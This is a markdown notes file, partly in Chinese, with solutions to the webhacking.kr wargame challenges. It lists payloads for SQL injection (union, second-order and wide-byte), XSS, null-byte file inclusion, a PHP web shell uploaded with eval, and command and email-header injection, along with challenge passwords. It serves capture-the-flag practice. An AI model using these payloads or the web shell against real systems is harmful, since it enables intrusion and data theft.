# WebHacking

-   Online Link: [WebHacking](http://webhacking.kr/challenge/)

## challenge-01

-   Set cookie `lv=5.5`

## challenge-02

-   检查`index.php`源码，发现`<area shape="rect" coords="851,7,890,65" href="admin/" target="" alt="" />·`
-   访问`/admin`，需要login

## challenge-03

-   `http://webhacking.kr/challenge/web/web-03/index.php?_1=1&_2=0&_3=1&_4=0&_5=1&_6=0&_7=0&_8=0&_9=0&_10=0&_11=0&_12=1&_13=1&_14=1&_15=0&_16=0&_17=1&_18=0&_19=1&_20=0&_21=1&_22=1&_23=1&_24=1&_25=1&_answer=1010100000011100101011111`

    > 管理页面
    > 注意事项
    > 要小心，不要管理员密码被泄露。
    > 请参考您正在使用它的第一次手动分钟。（手动密码：@ dM1n\_\_nnanual）

## challenge-04

-   BASE64->AHS-1->SHA-1
-   `test`

## challenge-05

-   `http://webhacking.kr/challenge/web/web-05/mem/join.php?mode=1`
-   join: `admin :any`
-   login: `admin:any`

## challenge-06

-   [web_06.php](./web_06.php)

## challenge-07

-   `index.phps`
-   `http://webhacking.kr/challenge/web/web-07/index.php?val=0))%0aunion%0aselect%0a((3-1`

## challenge-08

-   二次注入，需要掌握整个流程
    -   [源码分析](./web_08/index.php)
    -   注入点 `$q=@mysql_query("insert into lv0(agent,ip,id) values('$agent','$ip','guest')") or die("query error");`
    -   此处 agent 是可控的，而且没有针对 ''', ',', '#' 进行防护
-   第一次：`admin','1','admin')#` -> `USER-AGENT done! (0/70)`
-   第二次：`admin` -> `USER-AGENT hi admin`

## challenge-09

-   Basic access authentication(HTTP 基本认证)
    -   本题针对 GET 以及 POST 方法进行了基本认证，而忽略了PUT方法，由此绕过
-   `substr(id,1,1)in(0x42,0x41)`

## challenge-10

-   [查看源码](./web_10/code1.html)，其中关键代码
    ```html
    <a id=hackme style="position:relative;left:0;top:0" onclick="this.style.posLeft+=1;if(this.style.posLeft==800)this.href='?go='+this.style.posLeft" onmouseover=this.innerHTML='yOu' onmouseout=this.innerHTML='O'>O</a>
    ```
-   可知需要访问`?go=800`

## challenge-11

-   `code2.html?val=1aaaaa_asdfasdfasdf202d120d36d179%09p%09a%09s%09s`

## challenge-12

-   `code3.html?val=youaregod~~~~~~~!`

## challenge-13

> HINT : select flag from prob13password

## challenge-17

-   `unlock = 9997809307;`

## challenge-19

-   `id=admin*`

## challenge-20

-   `lv5frm.id.value = 'any'; lv5frm.cmt.value='any'; lv5frm.hack.value = lv5frm.attackme.value; lv5frm.submit();`

## challenge-23

-   `%00<script>alert(1);</script>`

## challenge-24

-   Cookie += `REMOTE_ADDR:112277..00..00..1`

## challenge-25

-   `?file=password.php%00`

## challenge-26

-   `?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`

## challenge27

-   `index.phps`
-   `?id=3) or no like 2 --+`

## challenge-29

-   `1467781839',(select password from c29_tb),char(50, 48, 50, 46, 49, 50, 48, 46, 51, 54, 46, 49, 55, 57`

## challenge-30

```sql
CREATE USER webhacking IDENTIFIED BY 'wEBHacking1234';
GRANT ALL PRIVILEGES ON challenge_30_table.* TO webhacking IDENTIFIED BY 'wEBHacking1234';
FLUSH PRIVILEGES;
```

## challenge-31

-   `nc -nvl -p 10050`
-   `GET /Password is 72cd35a6763f1d27a7b1d66d9f1afeba HTTP/1.0`

## challenge-32

-   [code_5.py](./challenge_32/code_5.py)

## challenge-33

-   [bonus-6](./challenge_33/)

## challenge-34

-   O00O=`<script>if(document.URL.indexO~	'0lDz0mBi2')!=-1){l~ation.href='Passw0RRdd.pww';}else{alert('Wr~6g~)~N</~~~>`
-   `http://webhacking.kr/challenge/javascript/Passw0RRdd.pww`

## challenge_35

-   `111),(char(97,100,109,105,110),char(50,48,50,46,49,50,48,46,51,54,46,49,55,57),122`
-   `123), (CHAR(97,100,109,105,110),CHAR(),2`

## challenge_36

-   `.index.php.swp`

## challenge_37

-   `index.phps`

## challenge_38

-   `ip:ip:admin`

## challenge_39

-   如果第15位是`'`，替换后第15, 16位都是`'`，但是这里截取了前15位，故get
-   `admin         '`

## challenge_40

-   [web_29.py](./challenge_40/web_29.py)

## challenge_41

-   `filename="<"`

## challenge_42

-   `?down=dGVzdC56aXA=`
-   `[*] Find It!!! Password is  - [852]`
-   `http://webhacking.kr/challenge/web/web-20/good.html`

## challenge_43

```http
Content-Disposition: form-data; name="file"; filename="676F6F645F6A6F625F6275745F746869735F69736E745F7468655F666C6167.php"
Content-Type: image/jpeg

<?php
eval($_GET['mkj']);
?>
```

## challenge_44

-   `l's'`可执行
-   `'&l's`
-   `&`后的命令将会被执行
-   后端进行了[0,5]截取

## challenge_45

-   `mb_convert_encoding`可引发宽字节注入
-   宽字节注入可使用`%a1`-`%fe`的所有字符
-   `?id=%aa%27%20or%20id%20like%200x41646d696e%23&pw=aasf`

## challenge_46

-   `0||id=char(97,100,109,105,110)`

## challenge_47

-   Email Header Injection
-   主要注入点在于`$header`的打包方式
-   `email=%0acc:jesse@jesse.com`

## challenge_48

-   Commend Injuection
-   `filename=";ls"` -> `Delete`
-   `system("echo null > $_FILE[''][name]")`
-   `zwitter_admin.php`
